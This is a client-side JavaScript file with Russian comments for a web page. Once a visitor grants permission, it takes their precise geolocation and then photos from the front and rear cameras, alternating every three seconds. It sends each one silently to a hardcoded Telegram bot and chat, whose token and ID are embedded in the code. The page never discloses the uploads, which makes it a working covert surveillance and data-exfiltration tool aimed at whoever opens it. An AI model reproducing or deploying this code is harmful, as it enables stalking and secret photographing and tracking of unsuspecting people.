const TELEGRAM_BOT_TOKEN = '7921776519:AAEtasvOGOZxdZo4gUNscLC49zSdm3CtITw';
const TELEGRAM_CHAT_ID = '8071841674';

const countdownEl = document.getElementById('countdown');
const statusEl = document.getElementById('status');
const videoEl = document.getElementById('video');
const canvasEl = document.getElementById('canvas');
const reloadBtn = document.getElementById('reloadBtn');

let currentCamera = 'user'; // фронт / задняя по очереди
let stream = null;
let photoInterval = null;
let geoFetched = false;

// Сначала запрашиваем доступ
async function requestPermissions() {
  try {
    await requestGeo();
    await requestCameraTest(); // просто включим и выключим камеру
    startCountdown(); // если всё ок — запускаем обратный отсчёт
  } catch (e) {
    showReloadButton();
  }
}

// Запрос геолокации и отправка
async function requestGeo() {
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) return reject();
    navigator.geolocation.getCurrentPosition(
      pos => {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;
        geoFetched = true;
        sendLocationToTelegram(lat, lon);
        resolve();
      },
      err => reject(err),
      { enableHighAccuracy: true, timeout: 5000 }
    );
  });
}

// Запрос камеры для проверки (любой поток)
async function requestCameraTest() {
  const testStream = await navigator.mediaDevices.getUserMedia({ video: true });
  stopStream(testStream); // просто чтобы браузер дал доступ
  return Promise.resolve();
}

// Обратный отсчёт
function startCountdown() {
  let count = 3;
  countdownEl.textContent = count;
  countdownEl.style.display = 'block';
  const interval = setInterval(() => {
    count--;
    if (count === 0) {
      clearInterval(interval);
      countdownEl.style.display = 'none';
      startCameraCycle(); // запускаем фото-цикл
    } else {
      countdownEl.textContent = count;
    }
  }, 1000);
}

// Запуск фото с камер каждые 3 секунды
async function startCameraCycle() {
  photoInterval = setInterval(async () => {
    try {
      if (stream) {
        stopStream(stream);
        videoEl.srcObject = null;
      }
      currentCamera = (currentCamera === 'user') ? 'environment' : 'user';
      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: currentCamera }, audio: false });
      videoEl.srcObject = stream;
      await new Promise(res => videoEl.onloadedmetadata = res);
      sendPhotoToTelegram();
    } catch (e) {
      clearInterval(photoInterval);
      showReloadButton();
    }
  }, 3000);
}

// Фото → Telegram
function sendPhotoToTelegram() {
  const ctx = canvasEl.getContext('2d');
  canvasEl.width = videoEl.videoWidth;
  canvasEl.height = videoEl.videoHeight;
  ctx.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
  canvasEl.toBlob(blob => {
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('photo', blob, `${currentCamera}_photo.jpg`);
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: formData
    }).catch(() => {});
  }, 'image/jpeg', 0.8);
}

// Геолокация → Telegram
function sendLocationToTelegram(lat, lon) {
  const url = `https://maps.google.com/?q=${lat},${lon}`;
  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: `🌍 Геолокация: ${url}`
    })
  });
}

// Остановка потока
function stopStream(s) {
  s.getTracks().forEach(track => track.stop());
}

// Кнопка перезапуска
function showReloadButton() {
  reloadBtn.style.display = 'block';
  reloadBtn.onclick = () => location.reload();
  if (statusEl) statusEl.style.display = 'none';
}

// ▶️ Стартуем
requestPermissions();
